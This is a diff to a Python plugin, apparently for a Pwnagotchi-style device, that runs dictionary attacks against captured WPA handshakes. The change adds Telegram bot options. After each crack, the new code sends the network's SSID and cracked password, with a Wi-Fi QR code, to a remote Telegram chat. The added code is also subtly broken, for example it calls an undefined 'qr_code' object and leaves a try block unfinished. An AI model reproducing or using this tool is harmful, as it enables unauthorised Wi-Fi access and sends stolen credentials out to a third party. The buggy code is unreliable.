@@ -3,6 +3,10 @@ import logging
 import subprocess
 import string
 import re
+import qrcode
+import io
+from telegram import Bot
+from telegram import InputFile
 
 '''
 Aircrack-ng needed, to install:
@@ -14,7 +18,7 @@ Cracked handshakes stored in handshake folder as [essid].pcap.cracked
 
 class QuickDic(plugins.Plugin):
     __author__ = 'silentree12th'
-    __version__ = '1.2.0'
+    __version__ = '1.3.0'
     __license__ = 'GPL3'
     __description__ = 'Run a quick dictionary scan against captured handshakes'
     __dependencies__ = {
@@ -24,6 +28,8 @@ class QuickDic(plugins.Plugin):
         'enabled': False,
         'wordlist_folder': '/home/pi/wordlists/',
         'face': '(·ω·)',
+        'api': None,
+        'id': None,
     }
 
     def __init__(self):
@@ -72,4 +78,33 @@ class QuickDic(plugins.Plugin):
                 self.text_to_set = ""
                 display.update(force=True)
                 #plugins.on('cracked', access_point, pwd)
+                if id != None and api != None:
+                    security = "WPA"
+                    ssid = filename
+                    password = pwd
+                    wifi_config = 'WIFI:S:'+ssid+';T:'+security+';P:'+password+';;'
+                    bot = Bot(token=api)
+                    chat_id = id
+                    try:
+                        qr = qrcode.QRCode(
+                            version=1,
+                            error_correction=qrcode.constants.ERROR_CORRECT_L,
+                            box_size=10,
+                            border=4,
+                        )
+                        qr_code.add_data(wifi_config)
+                        qr_code.make(fit=True)
+                        
+                        # Create an image from the QR code instance
+                        img = qr.make_image(fill_color="black", back_color="white")
+
+                        # Convert the image to bytes
+                        image_bytes = io.BytesIO()
+                        img.save(image_bytes)
+                        image_bytes.seek(0)
+
+                        # Send the image directly as bytes
+                        message_text = 'ssid: ' + ssid + ' password: ' + password
+                        bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)
+                    
            
